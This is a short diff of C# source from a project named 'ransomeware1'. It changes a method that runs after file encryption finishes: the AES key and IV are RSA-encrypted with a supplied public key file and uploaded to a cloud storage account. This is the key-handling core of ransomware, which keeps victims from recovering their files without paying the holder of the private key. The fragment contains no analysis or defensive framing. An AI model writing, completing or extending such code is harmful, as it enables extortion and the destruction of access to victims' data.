@@ -65,10 +65,10 @@ namespace ransomeware1
             }
         }
 
-            public void OnFinishEncryption(CloudStorageAccount storageAccount)
+            public void OnFinishEncryption(CloudStorageAccount storageAccount, string publicKeyPath)
         {
-            byte[] encryptedKey = Utils.RSAEncryptBytes(myAes.Key);
-            byte[] encryptedIV = Utils.RSAEncryptBytes(myAes.IV);
+            byte[] encryptedKey = Utils.RSAEncryptBytes(myAes.Key, publicKeyPath);
+            byte[] encryptedIV = Utils.RSAEncryptBytes(myAes.IV, publicKeyPath);
 
             Utils.Upload(storageAccount, encryptedIV, "IV");
             Utils.Upload(storageAccount, encryptedKey, "key");
